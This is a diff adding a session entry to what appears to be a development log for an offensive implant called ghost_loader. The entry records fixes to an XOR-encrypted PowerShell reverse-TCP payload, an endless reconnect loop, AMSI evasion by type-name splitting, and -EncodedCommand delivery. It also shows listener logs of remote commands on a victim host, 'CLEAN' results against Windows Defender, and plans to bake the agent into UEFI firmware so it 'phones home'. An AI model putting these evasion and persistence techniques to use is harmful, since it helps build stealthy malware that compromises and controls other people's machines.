@@ -439,6 +439,54 @@ Phase 3 — CHEYANNE WATCH / VNC
 | test_listener.py connect + whoami/hostname | PASS |
 | 30s session held, zero KAV interference | PASS |
 
+### Session 2026-07-11 — ghost_loader TCP Callback Verified + Reconnect Loop — M6 COMPLETE
+
+**Operator machine:** LAPTOP-R32M8MLI (192.168.1.92)
+**AV:** Kaspersky Premium (avp.exe PID 5152) + Windows Defender RTP — both active
+**Scope:** Standalone ghost_loader.exe end-to-end TCP verification (prerequisite for Phase 11 M7 UEFI bake)
+
+#### Bugs Crushed
+
+| Bug | Root Cause | Fix |
+|-----|-----------|-----|
+| PS exits code 1 — last PS1 byte dropped | `sizeof(PAYLOAD_ENC) - 1` without trailing `0x00` sentinel. sizeof=307, PAYLOAD_LEN=306. Last byte (`}` closing while loop) never decrypted. PS received unclosed while block → parse error. | Append `, 0x00` to hex_array in build_ghost_loader.py. sizeof=308, PAYLOAD_LEN=307. All bytes processed. |
+| MessageBox debug blocking feedback | WaitForSingleObject blocked until PS exited, THEN called MessageBoxW (instant headless). No reconnect, no loop, one-shot per run. | Removed both MessageBoxW calls. WaitForSingleObject stays — holds ghost alive while PS is connected. |
+| No reconnect on PS death | WinMain exited cleanly after PS died. One-shot payload — connection loss = dead agent until next reboot. | Wrapped spawn+wait block in `for(;;)` with `Sleep(5000)`. ghost respawns PS 5s after death. |
+| listener.py stdout buffered in pipe | Python block-buffers stdout when piped (Desktop Commander). `sessions` output invisible. `NEW SESSION` invisible. | `PYTHONUNBUFFERED=1` before launch. Verification fallback: PENTEST_LOG.md (file writes unbuffered). |
+| Two listener instances racing :4443 | Auto-kill freed listen socket but established connections survived on old PID (unkillable — KAV protects python.exe). Both PIDs bound :4443. Old PID intercepted all new connections. | `taskkill /F /IM python.exe` — nuke all instances. Verify: `netstat -ano | findstr :4443` → one LISTENING PID only. |
+
+#### M6 Confirmation
+
+```
+[2026-07-11 06:16:31 UTC] NEW SESSION 33b4bb02   laptop-r32m8mli\gwu07@LAPTOP-R32M8MLI  192.168.1.92:56472
+[2026-07-11 06:17:38 UTC] INTERACT START: 33b4bb02
+[2026-07-11 06:17:40 UTC] CMD → 33b4bb02: dir
+[2026-07-11 06:19:15 UTC] CMD → 33b4bb02: whoami /priv
+[2026-07-11 06:21:24 UTC] INTERACT END: 33b4bb02
+
+Reconnect loop proof:
+[2026-07-11 07:01:05 UTC] NEW SESSION 33b4bb02   192.168.1.92:58409
+[2026-07-11 07:01:26 UTC] SESSION LOST: 33b4bb02   (PS killed manually)
+[2026-07-11 07:01:33 UTC] NEW SESSION 33b4bb02   192.168.1.92:59007   (7s — 5s sleep + startup)
+```
+
+#### ghost_loader.exe — Current State (M6 build)
+
+| Field | Value |
+|-------|-------|
+| Size | 102 KB |
+| Payload | 307 bytes PS1 XOR-encrypted |
+| AMSI evasion | Type-name splitting (`New-Object System.Net.Sockets.TCPClient`) |
+| Delivery | `-EncodedCommand` (UTF-8 → UTF-16LE → Base64 → powershell) |
+| Debug code | REMOVED — no MessageBox |
+| Reconnect | `while(1) { spawn PS → WaitForSingleObject(INFINITE) → Sleep(5000) → repeat }` |
+| KAV App Control | BLOCKED on operator machine (expected — unsigned). Target machines: Defender only, CLEAN. |
+| Defender | CLEAN (Get-MpThreatDetection = 0 detections) |
+
+**Next:** xxd ghost_loader.exe → agent_bytes.h → recompile RingStackDxe.efi → rebake OVMF.fd → QEMU boot → ghost phones home (M7).
+
+---
+
 ### Session 2026-06-26 — v4.0.0 Release — IDF Cyber Squad banner + Tri-vector persist — 8/8 PASS
 
 ```
